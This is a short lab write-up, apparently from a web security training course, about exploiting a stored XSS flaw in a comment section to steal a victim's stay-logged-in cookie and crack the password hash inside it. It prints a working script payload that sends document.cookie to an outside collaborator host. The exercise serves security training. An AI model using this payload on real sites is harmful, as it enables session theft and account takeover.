# Practitioner Lab 77: Offline password cracking

---

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

I began this lab by looking at the functionality,

After doing so I went and go the cookie using the following payload.

```
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

![Untitled](Practitioner%20Lab%2077%20Offline%20password%20cracking%200208eb6421a04181953bfbad2e8585ac/Untitled.png)

Another way to use it is to use the exploit server which I did on the following example 

![Untitled](Practitioner%20Lab%2077%20Offline%20password%20cracking%200208eb6421a04181953bfbad2e8585ac/Untitled%201.png)

After doing this I will use this cookie to bruteforce the password 

At this point it was unclear how I needed to use the stay-logged-in cookie so I tried to brute force without it on to see what it would do. 

![Untitled](Practitioner%20Lab%2077%20Offline%20password%20cracking%200208eb6421a04181953bfbad2e8585ac/Untitled%202.png)

Here we can see that the logged in token is carlos:hash 

now i need to check the hash

![Untitled](Practitioner%20Lab%2077%20Offline%20password%20cracking%200208eb6421a04181953bfbad2e8585ac/Untitled%203.png)

here I can see the hash and have the password.

![Untitled](Practitioner%20Lab%2077%20Offline%20password%20cracking%200208eb6421a04181953bfbad2e8585ac/Untitled%204.png)

![Untitled](Practitioner%20Lab%2077%20Offline%20password%20cracking%200208eb6421a04181953bfbad2e8585ac/Untitled%205.png)